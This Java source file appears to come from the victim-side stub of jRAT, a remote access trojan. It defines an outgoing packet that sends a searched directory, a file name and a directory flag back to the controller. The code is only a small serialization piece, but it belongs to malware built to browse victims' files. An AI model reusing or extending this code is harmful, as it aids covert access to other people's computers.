package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;


public class Packet37SearchResult extends AbstractOutgoingPacket {

	private String dir;
	private String name;
	private boolean directory;

	public Packet37SearchResult(String dir, String name, boolean directory) {
		this.dir = dir;
		this.name = name;
		this.directory = directory;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(dir);
		sw.writeLine(name);
		dos.writeBoolean(directory);
	}

	@Override
	public byte getPacketId() {
		return 37;
	}

}
